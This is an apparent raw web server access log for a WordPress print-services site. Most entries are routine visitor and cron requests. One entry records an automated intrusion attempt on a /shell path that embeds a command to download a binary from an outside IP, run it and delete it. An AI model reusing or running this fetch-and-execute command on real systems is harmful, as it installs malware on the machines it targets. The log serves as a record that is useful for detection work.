65.25.116.132 - - [25/Jul/2018:06:38:56 -0700] "GET /wp-content/themes/aablueprint-v1.3/css/core.css HTTP/1.1" 200 706 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
65.25.116.132 - - [25/Jul/2018:06:38:56 -0700] "GET /wp-content/themes/aablueprint-v1.3/css/layout.css HTTP/1.1" 200 2767 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
65.25.116.132 - - [25/Jul/2018:06:38:56 -0700] "GET /wp-content/themes/aablueprint-v1.3/css/base.css HTTP/1.1" 200 495 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
65.25.116.132 - - [25/Jul/2018:06:38:56 -0700] "GET /wp-content/plugins/supercarousel/js/jquery.ismouseover.js?ver=4.9.7 HTTP/1.1" 200 714 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
65.25.116.132 - - [25/Jul/2018:06:38:56 -0700] "GET /wp-content/plugins/supercarousel/js/jquery.imagesloaded.min.js?ver=4.9.7 HTTP/1.1" 200 926 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
65.25.116.132 - - [25/Jul/2018:06:38:56 -0700] "GET /wp-content/plugins/supercarousel/js/jquery.supercarousel.min.js?ver=4.9.7 HTTP/1.1" 200 2601 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
65.25.116.132 - - [25/Jul/2018:06:38:56 -0700] "GET /wp-content/plugins/supercarousel/js/jquery.easing.min.js?ver=4.9.7 HTTP/1.1" 200 2189 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
65.25.116.132 - - [25/Jul/2018:06:38:56 -0700] "GET /wp-content/plugins/supercarousel/js/jquery.mousewheel.js?ver=4.9.7 HTTP/1.1" 200 1280 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
65.25.116.132 - - [25/Jul/2018:06:38:56 -0700] "GET /wp-content/plugins/supercarousel/js/jquery.easing.compatibility.js?ver=4.9.7 HTTP/1.1" 200 727 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
65.25.116.132 - - [25/Jul/2018:06:38:56 -0700] "GET /wp-content/plugins/supercarousel/js/jquery.touchSwipe.min.js?ver=4.9.7 HTTP/1.1" 200 2221 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
65.25.116.132 - - [25/Jul/2018:06:38:56 -0700] "GET /wp-content/plugins/supercarousel/js/jquery.prettyPhoto.js?ver=4.9.7 HTTP/1.1" 200 6387 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
65.25.116.132 - - [25/Jul/2018:06:38:56 -0700] "GET /wp-includes/css/dashicons.min.css?ver=4.9.7 HTTP/1.1" 200 29329 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
65.25.116.132 - - [25/Jul/2018:06:38:56 -0700] "GET /wp-content/plugins/supercarousel/js/jquery.watch.js?ver=4.9.7 HTTP/1.1" 200 1627 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
65.25.116.132 - - [25/Jul/2018:06:38:56 -0700] "GET /wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1 HTTP/1.1" 200 4375 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
65.25.116.132 - - [25/Jul/2018:06:38:56 -0700] "GET /wp-includes/js/jquery/jquery.js?ver=1.12.4 HTTP/1.1" 200 34658 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
65.25.116.132 - - [25/Jul/2018:06:38:57 -0700] "GET /wp-content/plugins/nivo-slider/scripts/nivo-slider/jquery.nivo.slider.pack.js?ver=4.9.7 HTTP/1.1" 200 3437 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
65.25.116.132 - - [25/Jul/2018:06:38:57 -0700] "GET /wp-content/plugins/contact-form-7/includes/js/scripts.js?ver=5.0.3 HTTP/1.1" 200 4449 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
65.25.116.132 - - [25/Jul/2018:06:38:57 -0700] "GET /wp-includes/js/wp-embed.min.js?ver=4.9.7 HTTP/1.1" 200 1079 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
65.25.116.132 - - [25/Jul/2018:06:38:57 -0700] "GET /wp-content/plugins/jetpack/modules/wpgroho.js?ver=4.9.7 HTTP/1.1" 200 817 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
65.25.116.132 - - [25/Jul/2018:06:38:57 -0700] "GET /wp-content/themes/aablueprint-v1.3/img/logo_canon.jpg HTTP/1.1" 200 2015 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
65.25.116.132 - - [25/Jul/2018:06:38:57 -0700] "GET /wp-content/themes/aablueprint-v1.3/img/logo_hp.jpg HTTP/1.1" 200 1852 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
65.25.116.132 - - [25/Jul/2018:06:38:57 -0700] "GET /wp-content/uploads/2014/03/home-slide-4.jpg HTTP/1.1" 200 92688 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
65.25.116.132 - - [25/Jul/2018:06:38:57 -0700] "GET /wp-content/uploads/2014/03/home-slide-5.jpg HTTP/1.1" 200 83953 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
65.25.116.132 - - [25/Jul/2018:06:38:57 -0700] "GET /wp-content/themes/aablueprint-v1.3/img/logo_epson.jpg HTTP/1.1" 200 2077 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
65.25.116.132 - - [25/Jul/2018:06:38:57 -0700] "GET /wp-content/uploads/2018/07/50th_slide.png HTTP/1.1" 200 231905 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
65.25.116.132 - - [25/Jul/2018:06:38:57 -0700] "GET /wp-content/uploads/2018/07/HPPWXL8000.jpg HTTP/1.1" 200 322721 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
65.25.116.132 - - [25/Jul/2018:06:38:57 -0700] "GET /wp-content/themes/aablueprint-v1.3/img/photo-print-services.jpg HTTP/1.1" 200 13413 "http://www.aablueprint.com/wp-content/themes/aablueprint-v1.3/style.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
65.25.116.132 - - [25/Jul/2018:06:38:57 -0700] "GET /wp-content/uploads/2014/04/home-slide-2d.jpg HTTP/1.1" 200 155112 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
65.25.116.132 - - [25/Jul/2018:06:38:58 -0700] "GET /wp-content/themes/aablueprint-v1.3/img/photo-equipment-sales.jpg HTTP/1.1" 200 11244 "http://www.aablueprint.com/wp-content/themes/aablueprint-v1.3/style.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
65.25.116.132 - - [25/Jul/2018:06:38:57 -0700] "GET /wp-content/uploads/2014/04/home-slide-3_1.jpg HTTP/1.1" 200 84047 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
65.25.116.132 - - [25/Jul/2018:06:38:58 -0700] "GET /wp-content/themes/aablueprint-v1.3/img/arrow-down-white.png HTTP/1.1" 200 832 "http://www.aablueprint.com/wp-content/themes/aablueprint-v1.3/style.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
65.25.116.132 - - [25/Jul/2018:06:38:58 -0700] "GET /wp-content/themes/aablueprint-v1.3/img/logo-aa_blueprint.gif HTTP/1.1" 200 4760 "http://www.aablueprint.com/wp-content/themes/aablueprint-v1.3/css/layout.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
65.25.116.132 - - [25/Jul/2018:06:38:58 -0700] "GET /wp-content/themes/aablueprint-v1.3/img/logo_edge.jpg HTTP/1.1" 200 2756 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
65.25.116.132 - - [25/Jul/2018:06:38:58 -0700] "GET /wp-content/themes/aablueprint-v1.3/img/arrow-right-white.png HTTP/1.1" 200 450 "http://www.aablueprint.com/wp-content/themes/aablueprint-v1.3/style.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
65.25.116.132 - - [25/Jul/2018:06:38:58 -0700] "GET /wp-content/themes/aablueprint-v1.3/img/logo_repromax.jpg HTTP/1.1" 200 2122 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
65.25.116.132 - - [25/Jul/2018:06:38:58 -0700] "GET /wp-includes/js/wp-emoji-release.min.js?ver=4.9.7 HTTP/1.1" 200 4595 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
65.25.116.132 - - [25/Jul/2018:06:38:58 -0700] "GET /wp-content/themes/aablueprint-v1.3/img/icon_facebook.jpg HTTP/1.1" 200 3491 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
65.25.116.132 - - [25/Jul/2018:06:38:58 -0700] "GET /wp-content/themes/aablueprint-v1.3/img/icon-menu-mobile.gif HTTP/1.1" 200 418 "http://www.aablueprint.com/wp-content/themes/aablueprint-v1.3/css/layout.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
65.25.116.132 - - [25/Jul/2018:06:38:58 -0700] "GET /wp-content/themes/aablueprint-v1.3/favicon.ico HTTP/1.1" 200 11641 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
65.25.116.132 - - [25/Jul/2018:06:39:52 -0700] "GET /wp-content/themes/aablueprint-v1.3/img/bg-menu-open.gif HTTP/1.1" 200 349 "http://www.aablueprint.com/wp-content/themes/aablueprint-v1.3/css/layout.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
208.113.153.204 - - [25/Jul/2018:06:39:53 -0700] "POST /wp-cron.php?doing_wp_cron=1532525992.9315569400787353515625 HTTP/1.1" 200 409 "http://www.aablueprint.com/wp-cron.php?doing_wp_cron=1532525992.9315569400787353515625" "WordPress/4.9.7; http://www.aablueprint.com" 
65.25.116.132 - - [25/Jul/2018:06:39:52 -0700] "GET /print_services/vehicle-graphics/ HTTP/1.1" 200 7027 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
65.25.116.132 - - [25/Jul/2018:06:39:53 -0700] "GET /wp-content/uploads/2014/06/Truck+BarkCart1.png HTTP/1.1" 200 400595 "http://www.aablueprint.com/print_services/vehicle-graphics/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
65.25.116.132 - - [25/Jul/2018:06:39:53 -0700] "GET /wp-content/uploads/2014/05/Van-2.png HTTP/1.1" 200 715863 "http://www.aablueprint.com/print_services/vehicle-graphics/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
65.25.116.132 - - [25/Jul/2018:06:39:54 -0700] "GET /wp-content/uploads/2014/02/5.jpg HTTP/1.1" 200 483698 "http://www.aablueprint.com/print_services/vehicle-graphics/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
65.25.116.132 - - [25/Jul/2018:06:39:54 -0700] "GET /wp-content/uploads/2014/02/1.jpg HTTP/1.1" 200 143129 "http://www.aablueprint.com/print_services/vehicle-graphics/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
65.25.116.132 - - [25/Jul/2018:06:39:54 -0700] "GET /wp-content/uploads/2014/02/3.jpg HTTP/1.1" 200 126005 "http://www.aablueprint.com/print_services/vehicle-graphics/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
65.25.116.132 - - [25/Jul/2018:06:39:54 -0700] "GET /wp-content/themes/aablueprint-v1.3/img/background-print_services.jpg HTTP/1.1" 200 86464 "http://www.aablueprint.com/wp-content/themes/aablueprint-v1.3/style.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
65.25.116.132 - - [25/Jul/2018:06:39:54 -0700] "GET /wp-content/uploads/2014/02/6.jpg HTTP/1.1" 200 241264 "http://www.aablueprint.com/print_services/vehicle-graphics/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
65.25.116.132 - - [25/Jul/2018:06:39:54 -0700] "GET /wp-content/uploads/2014/02/2.jpg HTTP/1.1" 200 222140 "http://www.aablueprint.com/print_services/vehicle-graphics/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
65.25.116.132 - - [25/Jul/2018:06:39:54 -0700] "GET /wp-content/uploads/2014/02/7.jpg HTTP/1.1" 200 121202 "http://www.aablueprint.com/print_services/vehicle-graphics/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
65.25.116.132 - - [25/Jul/2018:06:39:54 -0700] "GET /wp-content/plugins/supercarousel/images/miscellaneous_sprite.png HTTP/1.1" 200 6067 "http://www.aablueprint.com/wp-content/plugins/supercarousel/css/supercarousel.css?ver=4.9.7" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
65.25.116.132 - - [25/Jul/2018:06:39:54 -0700] "GET /wp-content/uploads/2014/02/8.jpg HTTP/1.1" 200 203111 "http://www.aablueprint.com/print_services/vehicle-graphics/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
65.25.116.132 - - [25/Jul/2018:06:39:54 -0700] "GET /wp-content/uploads/2014/02/4.jpg HTTP/1.1" 200 448174 "http://www.aablueprint.com/print_services/vehicle-graphics/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
104.154.198.228 - - [25/Jul/2018:06:41:35 -0700] "GET /brands/canon-imageprograf/feed/ HTTP/1.1" 200 9065 "-" "Java/1.8.0_121" 
156.202.14.253 - - [25/Jul/2018:06:43:48 -0700] "GET /shell?cd+/tmp;cd+/var;wget+http://199.195.254.118/jaws+-O+lwodo;sh%+lwodo;rm+-rf+lwodo HTTP/1.1" 400 402 "-" "Gemini/2.0" 
208.113.153.204 - - [25/Jul/2018:06:44:58 -0700] "POST /wp-cron.php?doing_wp_cron=1532526298.3870129585266113281250 HTTP/1.1" 200 411 "http://www.aablueprint.com/wp-cron.php?doing_wp_cron=1532526298.3870129585266113281250" "WordPress/4.9.7; http://www.aablueprint.com" 
98.102.69.90 - - [25/Jul/2018:06:44:57 -0700] "GET / HTTP/1.1" 200 5769 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
98.102.69.90 - - [25/Jul/2018:06:44:59 -0700] "GET /wp-content/themes/aablueprint-v1.3/style.css HTTP/1.1" 200 4470 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
98.102.69.90 - - [25/Jul/2018:06:44:59 -0700] "GET /wp-content/plugins/nivo-slider/scripts/nivo-slider/nivo-slider.css?ver=4.9.7 HTTP/1.1" 200 1127 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
98.102.69.90 - - [25/Jul/2018:06:44:59 -0700] "GET /wp-content/plugins/contact-form-7/includes/css/styles.css?ver=5.0.3 HTTP/1.1" 200 987 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
98.102.69.90 - - [25/Jul/2018:06:44:59 -0700] "GET /wp-content/plugins/supercarousel/css/supercarousel.css?ver=4.9.7 HTTP/1.1" 200 1214 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
98.102.69.90 - - [25/Jul/2018:06:44:59 -0700] "GET /wp-content/plugins/supercarousel/css/prettyPhoto.css?ver=4.9.7 HTTP/1.1" 200 3151 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
98.102.69.90 - - [25/Jul/2018:06:44:59 -0700] "GET /wp-content/plugins/jetpack/modules/widgets/social-icons/social-icons.css?ver=20170506 HTTP/1.1" 200 878 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
98.102.69.90 - - [25/Jul/2018:06:44:59 -0700] "GET /wp-includes/css/dashicons.min.css?ver=4.9.7 HTTP/1.1" 200 29328 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
98.102.69.90 - - [25/Jul/2018:06:44:59 -0700] "GET /wp-content/plugins/jetpack/css/jetpack.css?ver=6.3.2 HTTP/1.1" 200 12708 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
98.102.69.90 - - [25/Jul/2018:06:44:59 -0700] "GET /wp-includes/js/jquery/jquery.js?ver=1.12.4 HTTP/1.1" 200 34658 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
98.102.69.90 - - [25/Jul/2018:06:44:59 -0700] "GET /wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1 HTTP/1.1" 200 4375 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
98.102.69.90 - - [25/Jul/2018:06:44:59 -0700] "GET /wp-content/plugins/supercarousel/js/jquery.supercarousel.min.js?ver=4.9.7 HTTP/1.1" 200 2601 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
98.102.69.90 - - [25/Jul/2018:06:44:59 -0700] "GET /wp-content/plugins/supercarousel/js/jquery.imagesloaded.min.js?ver=4.9.7 HTTP/1.1" 200 926 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
98.102.69.90 - - [25/Jul/2018:06:44:59 -0700] "GET /wp-content/plugins/supercarousel/js/jquery.ismouseover.js?ver=4.9.7 HTTP/1.1" 200 714 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
98.102.69.90 - - [25/Jul/2018:06:44:59 -0700] "GET /wp-content/plugins/supercarousel/js/jquery.easing.min.js?ver=4.9.7 HTTP/1.1" 200 2189 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
98.102.69.90 - - [25/Jul/2018:06:44:59 -0700] "GET /wp-content/plugins/supercarousel/js/jquery.easing.compatibility.js?ver=4.9.7 HTTP/1.1" 200 727 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
98.102.69.90 - - [25/Jul/2018:06:44:59 -0700] "GET /wp-content/plugins/supercarousel/js/jquery.touchSwipe.min.js?ver=4.9.7 HTTP/1.1" 200 2221 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
98.102.69.90 - - [25/Jul/2018:06:44:59 -0700] "GET /wp-content/plugins/supercarousel/js/jquery.mousewheel.js?ver=4.9.7 HTTP/1.1" 200 1280 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
98.102.69.90 - - [25/Jul/2018:06:44:59 -0700] "GET /wp-content/plugins/nivo-slider/scripts/nivo-slider/themes/bar/bar.css?ver=4.9.7 HTTP/1.1" 200 1423 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
98.102.69.90 - - [25/Jul/2018:06:44:59 -0700] "GET /wp-content/plugins/supercarousel/js/jquery.watch.js?ver=4.9.7 HTTP/1.1" 200 1627 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
98.102.69.90 - - [25/Jul/2018:06:44:59 -0700] "GET /wp-content/plugins/supercarousel/js/jquery.prettyPhoto.js?ver=4.9.7 HTTP/1.1" 200 6387 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
98.102.69.90 - - [25/Jul/2018:06:44:59 -0700] "GET /wp-content/plugins/nivo-slider/scripts/nivo-slider/themes/dark/dark.css?ver=4.9.7 HTTP/1.1" 200 1062 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
98.102.69.90 - - [25/Jul/2018:06:45:00 -0700] "GET /wp-content/plugins/nivo-slider/scripts/nivo-slider/themes/default/default.css?ver=4.9.7 HTTP/1.1" 200 1038 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
98.102.69.90 - - [25/Jul/2018:06:45:00 -0700] "GET /wp-content/plugins/nivo-slider/scripts/nivo-slider/themes/light/light.css?ver=4.9.7 HTTP/1.1" 200 1056 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
98.102.69.90 - - [25/Jul/2018:06:45:01 -0700] "GET / HTTP/1.1" 200 5712 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
98.102.69.90 - - [25/Jul/2018:06:45:02 -0700] "GET /wp-content/themes/aablueprint-v1.3/css/reset.css HTTP/1.1" 200 910 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
98.102.69.90 - - [25/Jul/2018:06:45:02 -0700] "GET /wp-content/themes/aablueprint-v1.3/css/base.css HTTP/1.1" 200 496 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
98.102.69.90 - - [25/Jul/2018:06:45:02 -0700] "GET /wp-content/themes/aablueprint-v1.3/css/core.css HTTP/1.1" 200 707 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
98.102.69.90 - - [25/Jul/2018:06:45:02 -0700] "GET /wp-content/themes/aablueprint-v1.3/css/layout.css HTTP/1.1" 200 2768 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
98.102.69.90 - - [25/Jul/2018:06:45:02 -0700] "GET /wp-content/uploads/2018/07/50th_slide.png HTTP/1.1" 200 231905 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
